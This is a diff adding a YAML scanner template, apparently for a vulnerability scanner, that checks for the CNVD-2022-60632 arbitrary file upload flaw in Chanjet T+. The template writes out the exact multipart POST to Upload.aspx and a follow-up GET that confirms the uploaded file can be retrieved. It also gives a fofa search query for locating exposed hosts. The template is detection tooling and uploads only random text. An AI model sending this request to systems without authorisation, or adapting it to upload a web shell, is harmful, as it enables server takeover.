@@ -1,0 +1,38 @@
+id: CNVD-2022-60632
+
+info: 
+  name: CNVD-2022-60632 畅捷通T+任意文件上传
+  author: zan8in
+  severity: high
+  verified: true
+  description: |
+    畅捷通T+ Upload.aspx处存在任意文件上传漏洞，攻击者可以从其中获取服务器权限。
+    fofa：app="畅捷通-TPlus" && icon_hash="-2067519629"
+
+set:
+  randstr: randomLowercase(20)
+  randbody: randomLowercase(32)
+  rboundary: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /tplus/SM/SetupAccount/Upload.aspx?preload=1
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: "\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"File1\";filename=\"{{randstr}}.html\"\r\n\
+        Content-Type: image/jpeg\r\n\
+        \r\n\
+        {{randbody}}\r\n\
+        ------WebKitFormBoundary{{rboundary}}--\r\n\
+        "
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /tplus/SM/SetupAccount/images/{{randstr}}.html
+    expression: response.status == 200 && response.body.bcontains(bytes(randbody))
+expression: r0() && r1()
+      
